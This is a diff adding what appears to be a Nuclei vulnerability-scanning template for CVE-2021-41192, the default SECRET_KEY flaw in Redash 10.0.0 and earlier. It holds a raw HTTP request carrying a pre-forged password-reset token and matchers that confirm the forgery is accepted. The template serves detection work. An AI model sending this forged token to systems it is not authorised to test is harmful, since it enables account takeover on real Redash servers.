@@ -1,0 +1,30 @@
+id: cve-2021-41192
+
+info:
+  name: Redash Default SECRET_KEY Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Redash 10.0.0 and earlier versions have a default SECRET_KEY. This allows attackers to forge sessions, reset passwords, and obtain sensitive information.
+  reference:
+    - https://github.com/getredash/redash/security/advisories/GHSA-fcpv-hgq6-87h7
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202111-2078
+  classification:
+    cve-id: CVE-2021-41192
+    cvss-score: 6.5
+
+http:
+  - raw:
+      - |
+        GET /reset/IjEi.YdEknw.htZVzELmilJCgsSYu1oMXXEVhWY HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Password Reset"
+        part: body
